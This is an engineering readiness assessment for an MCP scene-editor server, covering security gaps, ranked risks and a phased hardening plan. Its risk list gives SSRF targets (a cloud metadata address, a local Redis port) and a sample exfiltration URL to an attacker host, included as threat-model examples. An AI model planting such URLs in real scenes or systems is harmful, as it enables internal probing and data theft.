# R9 — Production Readiness Assessment

**Scope:** "MCP creates scene → user opens it in editor" workflow.
**Current state:** 13 commits on `feat/mcp-server`. MCP server ships stdio + streamable HTTP transports, 19 scene tools, vision sampling, resources/prompts. Target: Option B from R8 (server-side persistence with user-scoped scenes). Baseline: single-user editor with `localStorage` autosave, no backend, no auth, no Supabase client in the repo.

---

## 1. Readiness matrix

| Dimension | Current state | Needed for GA | Gap |
|---|---|---|---|
| **Transport security** | stdio (local) + HTTP on `0.0.0.0:<port>`, no TLS, no auth, `sessionIdGenerator` is `randomUUID()` but session unbound to user | TLS termination (ALB/Cloudflare), per-request auth, origin allowlist, DNS rebinding guard | No auth, no TLS, binds `0.0.0.0` by default (`transports/http.ts:30`) |
| **Auth (human → editor)** | None. `projectId="local-editor"` hardcoded in `apps/editor/app/page.tsx:31` | OAuth (GitHub/Google) or magic link; session cookie; JWT for API; Supabase Auth if we adopt it | Starting from zero; no user model, no login UI |
| **Auth (MCP → API)** | None. stdio spawns local process; HTTP transport accepts any caller | Per-user MCP tokens (OAuth2 device flow or PAT), token rotation, scoped capabilities | No token concept, no issuer, no revocation |
| **Persistence** | `localStorage` only (`editor/src/lib/scene.ts:379`) | Server-side DB with per-user rows, versioned rows, RLS | No DB, no API, no migration story |
| **RLS / ownership** | N/A (no DB) | Postgres RLS: `USING (auth.uid() = owner_id)` on `scenes`, `scene_versions`, `scene_assets` | Needs full data model from scratch |
| **URL validation in scenes** | `GuideNode.url`, `ScanNode.url`, `MaterialSchema.texture.url`, `ItemNode.thumbnail`/`src` are bare `z.string()` (`core/src/schema/nodes/guide.ts:7`, `scan.ts:7`, `material.ts:33`, `item.ts:81-82`) | Allowlist (our CDN + signed-URL origins only), SSRF-safe parser, `data:` caps, `blob:` rejection at save-time | Zero validation; SSRF primitive surfaces any time editor or MCP renders a scene |
| **CSP / headers** | `next.config.ts` allows images from `protocol: https, hostname: '**'` and `protocol: http, hostname: '**'` | Explicit CSP (`img-src`, `connect-src`, `media-src`, `script-src 'self'`), HSTS, `X-Frame-Options`, `Referrer-Policy` | No headers set; wildcard image hosts |
| **Rate limiting** | None on HTTP transport (`transports/http.ts`) | Token-bucket per user + per-IP; stricter bucket on mutating tools; MCP tool-call ceiling | None |
| **Quota** | None. An agent can call `create_wall` infinitely; `setScene` accepts any-size JSON | Per-user scene count cap, per-scene node count cap (e.g. 50k), per-version bytes cap (e.g. 5 MB), monthly tool-call cap | None |
| **Size caps** | None. Next `serverActions.bodySizeLimit: '100mb'` (`next.config.ts:19`) is the only ceiling | Explicit per-endpoint limits (256 KB scene patch, 5 MB full save), gzip required, reject on oversize before parse | 100 MB server-action body limit is a DoS amplifier |
| **Concurrency** | Last-write-wins implicit; no version token, no lock | Optimistic concurrency via `if-match: <version>` ETag; reject stale saves; later: CRDT (Yjs/Automerge) for true multi-agent | No detection at all; silent overwrite |
| **Versioning** | `temporal` (zundo) exists in-memory; not persisted | Every save creates `scene_versions` row; retain last N + all "named" versions; soft delete | No persistence at all |
| **Schema evolution** | `setScene.migrateNodes` hook exists in core (per `CROSS_CUTTING.md` §2) but no migration registry | Versioned schema tag on every row (`schema_version: int`), forward-migration functions, replay on load | No schema version field in scene JSON today |
| **Observability** | `console.error` only (`transports/http.ts:33`) | Structured logs (JSON), trace ID per MCP request, Sentry/similar error reporting, metric counters for tool calls | No traces, no error pipeline, no metrics |
| **Audit log** | None | Append-only `scene_events` table with user, tool, timestamp, diff-size, source (mcp/human) | None |
| **GDPR / data rights** | N/A (no user data stored server-side) | DSAR endpoint (export scenes as JSON/GLB), deletion pipeline, consent banner, processor contracts | Needs legal + product work |
| **Cost model** | Storage = 0 (localStorage on user's device) | Budget per user: ~10 MB scenes + thumbnails; CDN egress ~100 MB/mo free tier; vision sampling cost per call | Unknown; depends on choice of storage (Supabase Storage vs S3) |
| **Offline support** | Implicit — `localStorage` works offline | Service Worker + IndexedDB mirror; background sync queue; conflict resolution on reconnect | Current localStorage works but only on same device/browser |
| **Multi-agent collab** | None (single Zustand store, no broadcast) | Realtime channel (Supabase Realtime / Ably / WebSockets); op-log or CRDT; presence | Architectural rewrite |
| **Thumbnail pipeline** | Client-side only (`thumbnail-generator.tsx`) | Server-side rendering worker (headless Three or pre-rendered bake); CDN caching; signed URLs | No server path; MCP cannot currently produce a thumbnail without the editor |
| **Testing at load** | Unit + smoke tests only | Load tests (k6/artillery): 100 concurrent MCP sessions, 1000 writes/min, 95p < 500 ms | No load suite |
| **Secrets hygiene** | No secrets in repo yet | HSM/Vault, per-env keys, rotation policy, supply-chain scanning (SBOM) | Not addressed |

---

## 2. Top 10 risks ranked by severity

1. **SSRF via scene URLs (Critical)**
   Any `GuideNode.url` / `ScanNode.url` / `MaterialSchema.texture.url` is a `z.string()`. If MCP writes a scene containing `http://169.254.169.254/latest/meta-data/` or `http://localhost:6379`, when a user later opens that scene the editor `<img>` / `<texture>` load will fetch it from the user's browser or from an SSR render pipeline. With wildcard `images.remotePatterns` this is already loaded client-side. Severity high because MCP is exactly the attacker-controllable input source.

2. **No auth on HTTP transport (Critical)**
   `transports/http.ts` binds `0.0.0.0` and generates session IDs client-gettable. Anyone on the network (or Internet if exposed) can invoke every tool — including `apply_patch`, `delete_node`, and write through to an eventual backend. Today this is "only local," but that is a deploy-time decision; the code has no hard barrier.

3. **No user model → no meaningful RLS possible (High)**
   Everything below depends on user identity. Without auth, quotas, audit trails, data deletion, concurrent-edit resolution, and cost accounting all collapse to guesswork.

4. **Unbounded scene size / tool-call rate → DoS + cost blowup (High)**
   `apply_patch` accepts batched ops with no ceiling. `place_item` can be called in a loop. Combined with Next's 100 MB server-action limit, a compromised MCP can push gigabyte-scale scenes or detonate CDN bills.

5. **Last-writer-wins silent overwrite (High)**
   Two agents (or an agent + a human) editing simultaneously: whoever saves last wins, no warning. With MCP autonomous workflows this is likely, not hypothetical.

6. **No schema version on persisted scenes (High)**
   First breaking change to `@pascal-app/core` schemas (e.g. `SiteNode.children` fix in `CROSS_CUTTING.md` §2) will silently corrupt saved scenes. There is no `schema_version: n` today.

7. **Dev bridge leaks scene store to window (Medium)**
   `apps/editor/app/page.tsx:13-15` sets `window.__pascalScene` in non-production. If `NODE_ENV` is ever mis-set, or a preview deploy ships, any XSS becomes a full scene-graph takeover. Guard is environment-string based, not build-time stripped.

8. **No CSP; wildcard image hosts (Medium)**
   `next.config.ts` allows `http(s)://**`. Combined with Risk 1 this is a clean data exfiltration channel: attacker-controlled URL in scene → user's browser GETs `https://attacker.com/?cookie=...` as an image load. `document.cookie` doesn't leak, but `Referer` and timing do.

9. **No observability → breaches invisible (Medium)**
   Only `console.error`. No audit log, no trace IDs. We would not detect an in-progress compromise until a user complained.

10. **Supply chain: `@modelcontextprotocol/sdk` and vision tooling (Medium)**
    MCP SDK is v1.29.0 and moving fast. Vision tools call out to the host's model provider. Neither has SBOM, pinned digests, or review gate in our CI.

---

## 3. Recommended hardening order

Phased by dependency: each phase unblocks the next.

### Phase A — "don't ship HTTP transport to the open Internet" (days)

1. Default HTTP bind to `127.0.0.1`; require explicit `--bind 0.0.0.0` flag with warning.
2. Add `Origin` / `Host` header check for DNS rebinding (MCP SDK 1.29 has a guard; verify enabled).
3. Mandatory bearer token on HTTP transport; `PASCAL_MCP_TOKEN` env; reject without it.
4. Strip `window.__pascalScene` at build-time (`defineConfig` constant) rather than runtime `NODE_ENV` check.
5. Add strict CSP to `apps/editor` (`Content-Security-Policy: default-src 'self'; img-src 'self' data: https://<our-cdn>; ...`).
6. Replace `z.string()` with `z.string().url()` plus a **URL validator** on `GuideNode.url`, `ScanNode.url`, `MaterialSchema.texture.url`, `ItemNode.thumbnail`/`src`. Allowlist: `data:image/*` (≤ 256 KB), our CDN origin, and signed-URL hosts only. Reject `file:`, `blob:`, `javascript:`, private IPs, link-local, `.internal`.

### Phase B — auth + persistence skeleton (weeks 1–2)

7. Pick auth stack (Supabase Auth, Clerk, or self-rolled NextAuth). Supabase gives RLS + storage + realtime for free, so it's the low-friction default even if R8's Option B is a different DB.
8. Design minimal schema:
   - `scenes(id, owner_id, name, current_version_id, created_at, updated_at, schema_version int)`
   - `scene_versions(id, scene_id, parent_version_id, body_jsonb, byte_size, author_id, source enum('human','mcp'), created_at)`
   - `scene_assets(id, scene_id, kind, sha256, cdn_url, byte_size, owner_id)`
   - `mcp_tokens(id, user_id, hashed_token, scopes, last_used_at, revoked_at)`
9. RLS on all four tables: `owner_id = auth.uid()`. Never use Supabase service role from browser.
10. Server API (Next Route Handlers or tRPC): `POST /api/scenes`, `GET /api/scenes/:id`, `PUT /api/scenes/:id` (takes `if-match` ETag = version ID). All checks `auth.getUser()`.
11. MCP: add `PASCAL_API_URL` + `PASCAL_API_TOKEN` env. Every tool that mutates routes through `apiClient`. Token = per-user PAT, hashed in DB, revocable.

### Phase C — quotas, size caps, rate limiting (week 2–3)

12. Per-user quotas: 100 scenes, 50k nodes/scene, 5 MB/version, 10k MCP tool calls/day. Enforce at write-path.
13. Rate limiting: Upstash Ratelimit or Postgres advisory locks. 100 req/min global, 20 req/min mutating.
14. Reject requests with `content-length` > cap before reading body.
15. Add size budget to `apply_patch`: max 500 ops per call; reject otherwise.

### Phase D — concurrency + versioning (week 3–4)

16. Every `PUT /api/scenes/:id` requires `if-match` ETag. On mismatch return 409 with the current version for client merge.
17. Insert a `scene_versions` row on every successful save. Retain last 50; keep all "named" ones; soft-delete older.
18. Expose `GET /api/scenes/:id/versions` + `GET /api/scenes/:id/versions/:v` for history UI.
19. Add `schema_version` to persisted body (start at `1`); migration registry `coreSchemaMigrations[n]` in `@pascal-app/core`; run on load.

### Phase E — observability + audit (week 4–5)

20. Structured JSON logs (pino), trace IDs propagated through MCP tool calls via headers / session meta.
21. Sentry (or equivalent) for both editor and MCP server.
22. Append-only `scene_events(id, scene_id, user_id, tool, diff_size, source, ts)`.
23. Basic dashboard: writes/min, tool mix, p95 latency, error rate.

### Phase F — compliance + cost (week 5–6)

24. DSAR endpoint `GET /api/me/export.zip` (all scenes + versions + assets).
25. Account deletion pipeline: hard-delete within 30 days, audit record of deletion.
26. Privacy notice update (`apps/editor/app/privacy/page.tsx`) to describe MCP ingress.
27. Cost model: storage $/scene (estimate ~50 KB avg compressed JSON, 500 KB thumbnails), CDN egress, Sentry seat, Supabase tier.

### Phase G — collab (month 2+)

28. Realtime channel per scene; presence; ephemeral locks per subtree.
29. CRDT decision (Yjs with a lossless bridge to our scene graph) — or stay with OT + server-authoritative ops.

---

## 4. "Beta" vs "GA" checkpoints

### Ready for beta (closed, trusted users, ≤ 100 accounts)

- Phase A complete.
- Phase B (auth + persistence skeleton) complete.
- Phase C-lite: soft quotas + rate limiting; no hard enforcement on node count yet.
- Phase D-lite: `if-match` ETag on writes; version history retained but not yet surfaced in UI.
- Observability: Sentry + basic logs. No dashboards required.
- Privacy notice updated. No DSAR endpoint yet (manual support OK for ≤ 100 users).
- Acceptance criteria:
  - Two agents hitting the same scene get a clean 409 on the loser, not silent overwrite.
  - Saving a 6 MB scene returns a structured error, not a 500.
  - Loading a 2-week-old scene still works after a schema change.
  - Revoking an MCP token blocks that client within 60 s.
  - An attacker-controlled URL in a scene does **not** cause the editor to call out to `169.254.169.254`.

### Ready for GA (open signup, cost accountable)

- All of Phase A–F complete.
- Load tested: 500 concurrent MCP sessions, 2000 writes/min, p95 < 500 ms for read, < 1 s for write.
- Full audit log searchable by operator.
- DSAR + deletion pipeline with SLA (≤ 30 days).
- Written incident response runbook; on-call rotation.
- External pen test focused on MCP transport + URL sanitization (repeat of Phase 3 audit).
- CSP in `Content-Security-Policy` header (not just report-only).
- Thumbnail pipeline server-side (so a scene created by MCP can be listed in a gallery without opening the editor).
- Phase G (realtime collab) can be post-GA if we accept "single active editor per scene at a time" as a UX contract for v1.

---

## 5. Verdict

**Weeks or months to production: ~10–14 weeks minimum to GA, ~4–5 weeks to credible private beta**, assuming one full-time engineer on the hardening work and Option B from R8 (server-side persistence) is chosen.

Rough breakdown:

- **Private beta: ~4–5 weeks** (Phases A–D at MVP depth).
- **Public beta: ~8 weeks** (add Phase E, quota enforcement, version UI, one round of pen-test fixes).
- **GA: ~12–14 weeks** (add Phase F: compliance, cost accounting, DSAR, load-test-driven tuning, external pen test).

The schedule is dominated by:

1. **Auth + persistence from scratch** — the repo has none today. Supabase would compress this to ~1 week; NextAuth + self-hosted Postgres is ~2–3 weeks.
2. **URL hardening on the core schemas** — a breaking change requiring a migration, though small in code size.
3. **Concurrency model** — ETag-based OCC is ~1 week; real CRDT collab is a month and probably post-GA.

**Blockers that could push this out:**

- If R8 picks an Option B that requires rewriting `@pascal-app/core` schemas (e.g. moving to a DB-native format), add 2–4 weeks.
- If legal requires SOC 2 or EU data residency before launch, add 2–3 months.
- Any real-time multi-agent requirement in v1 moves GA out by 4–6 weeks.

**Recommendation.** Ship Phase A (transport hardening + URL validation) in the first week independently of R8 — it's cheap, it reduces blast radius today, and it's not coupled to the persistence choice. Block any public deploy of the HTTP transport until Phase A lands.
